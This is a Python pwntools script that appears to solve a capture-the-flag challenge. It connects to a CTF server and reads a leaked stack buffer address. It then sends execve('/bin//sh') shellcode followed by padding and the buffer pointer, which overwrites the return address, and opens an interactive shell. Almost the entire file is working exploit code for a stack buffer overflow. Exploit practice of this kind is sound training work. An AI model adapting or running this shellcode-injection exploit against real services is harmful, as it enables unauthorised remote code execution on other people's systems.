#!/usr/bin/env python3
from pwn import *

context.update(arch="amd64", timeout=1)

p = remote("ctf.example.org", 4104)

# get buffer address
p.recvuntil(b"0x")
ptr_repr = p.recvlineS()

# search "shortest shellcode x86_64", first google result):
shellcode = """
xor esi, esi
push rsi
mov rbx, 0x68732f2f6e69622f
push rbx
push rsp
pop rdi
imul esi
mov al, 0x3b
syscall
"""
# fix: shellcode pushes to stack, overriding the shellcode himself. so we add this instruction to get enough space:
shellcode = "pop rax\npop rax\n" + shellcode
log.warn("shellcode len: " + str(len(asm(shellcode))))

# generate flat payload (shellcode + filling + buffer ptr)
log.info("Payload:")
payload = flat(
    {
        0: asm(shellcode),
        "ahaa": unhex(ptr_repr)[::-1],
    }
)
log.hexdump(payload)
p.sendlineafter(b"mot de passe:\n", payload)
p.interactive()
